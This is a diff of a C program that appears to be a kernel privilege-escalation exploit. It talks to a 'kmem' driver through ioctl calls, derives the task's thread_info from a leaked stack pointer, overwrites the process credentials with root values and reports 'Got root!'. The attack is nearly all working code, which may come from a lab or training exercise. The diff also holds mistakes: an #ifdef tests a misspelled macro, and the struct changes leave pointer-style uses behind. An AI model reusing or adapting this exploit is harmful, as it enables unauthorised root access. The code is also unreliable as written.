@@ -10,14 +10,14 @@
 
 #include "kmem_ioctl.h"
 
+#define UBUNTU14 1
+
 #ifdef UNUNTU14 // 32
 # define THREAD_SIZE 0x2000
 # define TASK_CRED_OFFSET 1020
-# define CRED_SIZE 124
 #else // UBUNTU16
 # define THREAD_SIZE 0x4000
 # define TASK_CRED_OFFSET 2632
-# define CRED_SIZE 168
 #endif
 
 static void fatal(char *msg)
@@ -57,15 +57,14 @@ int main(int argc, char *argv[])
 	}
 	printf("open: fd %d\n", fd);
 
-	//ioctl(fd, KMEM_IOCTL_GET_ROOT);
-	struct kmem_ioctl *stack = malloc(sizeof(struct kmem_ioctl));
-	stack->stack_ptr = NULL;
+	struct kmem_ioctl stack;
+	stack.stack_ptr = NULL;
 	rc = ioctl(fd, KMEM_IOCTL_STACK_PTR, stack);
 	if (rc < 0)
                 fatal(" [+] Failed to read stack pointer");
 	printf("ioctl: stack ptr %p\n", stack->stack_ptr);
 
-	void *current_thread_info = ((unsigned long)stack->stack_ptr & ~(THREAD_SIZE - 1));
+	void *current_thread_info = ((unsigned long)stack.stack_ptr & ~(THREAD_SIZE - 1));
 	printf("current_thread_info ptr %p\n", current_thread_info);
 	void *current;
 	struct kmem_ioctl mem = { .rw_ulong = { .buf = &current, .ppos = current_thread_info } };
@@ -97,11 +96,6 @@ int main(int argc, char *argv[])
 	};
 	struct kmem_ioctl current_cred = { .rw = { .buf = root_creds, .count = sizeof(root_creds), .ppos = cred } };
 	rc = ioctl(fd, KMEM_IOCTL_WRITE, &current_cred);
-
-	/*for(int i = 0; i < CRED_SIZE; ++i) {
-		printf("0x%02x, ", cred_buf[i]);
-	}
-	printf("\n");*/
 
         if (getuid() == 0) {
                 printf(" [+] Got root!\n");
